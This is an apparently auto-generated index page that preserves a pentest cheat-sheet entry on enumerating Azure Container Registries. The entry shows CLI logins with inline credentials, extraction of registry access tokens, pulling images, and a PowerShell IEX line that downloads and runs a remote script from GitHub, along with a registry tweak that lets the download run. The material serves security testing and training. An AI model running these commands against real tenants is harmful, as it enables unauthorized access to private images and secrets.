---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Azure Services - Container Registry

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-azure-azure-services-container-registry` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-container-registry.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Azure Services - Container Registry](../../topics/cloud/azure-services-container-registry.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-azure-azure-services-container-registry |
| name | Azure Services - Container Registry |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/azure/azure-services-container-registry.md |

## Preserved Source Material

````yaml
_body: "# Azure Services - Container Registry\n\n## Enumerate\n\nList container registries in the subscription using Azure\
  \ CLI\n\n```ps1\naz login -u user@domain.onmicrosoft.com -p pass\naz acr list -o table\n```\n\nLogin to the Registry\n\n\
  ```ps1\nacr=<ACRName> # from the previous command\nserver=$(az acr login -n $acr --expose-token --query loginServer -o tsv)\
  \ \ntoken=$(az acr login -n $acr --expose-token --query accessToken -o tsv) \ndocker login $server -u 00000000-0000-0000-0000-000000000000\
  \ -p $token \n```\n\nList the images in the ACR\n\n```ps1\naz acr repository list -n $acr \n```\n\nList version tags for\
  \ an image\n\n```ps1\naz acr repository show-tags -n $acr --repository mywebapp\n```\n\nConnect to the container registry\
  \ from a PowerShell console, set the $server and $token variables, and pull the image from the registry\n\n```ps1\n# docker\
  \ login ${registryURI} --username ${username} --password ${password}\n$token=\"<AccessToken>\"\n$server=\"<LoginServer>\"\
  \ndocker login $server -u 00000000-0000-0000-0000-000000000000 -p $token\ndocker pull $server/mywebapp:v1\n```\n\nList docker\
  \ containers inside a registry\n\n```ps1\nIEX (New-Object Net.WebClient).downloadstring(\"https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Get-AzACR.ps1\"\
  )\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\" -Name \"DisableFirstRunCustomize\" -Value\
  \ 2\nGet-AzACR -username ${username} -password ${password} -registry ${registryURI}\n```\n\n## References\n\n* [PENTESTING\
  \ AZURE: RECON TECHNIQUES - April 29, 2022 Stefan Tita](https://securitycafe.ro/2022/04/29/pentesting-azure-recon-techniques/)\n\
  * [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)"
_relative_path: cloud/azure/azure-services-container-registry.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/azure/azure-services-container-registry.md
````
